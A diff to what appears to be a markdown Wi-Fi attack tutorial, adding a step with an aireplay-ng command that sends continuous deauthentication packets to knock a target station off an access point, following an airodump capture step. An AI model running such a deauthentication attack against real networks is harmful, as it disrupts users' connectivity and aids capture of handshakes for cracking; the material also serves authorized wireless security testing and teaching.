@@ -51,6 +51,14 @@ Once executed, the `.cap` file will be created, which can be used for further an
 
   ![Setup](Images/airodump_target.png)
 
+### Terminal-3
+  7. Send deauthentication packets to the target
+     
+<pre lang="markdown">aireplay-ng --deauth 0 -a &lt;BSSID/AP's MAC&gt; -c &lt;Target/Station MAC&gt; &lt;interface&gt;</pre>
+
+  ![Setup](Images/deauth.png)
+
+
 
 
 <pre lang="markdown">
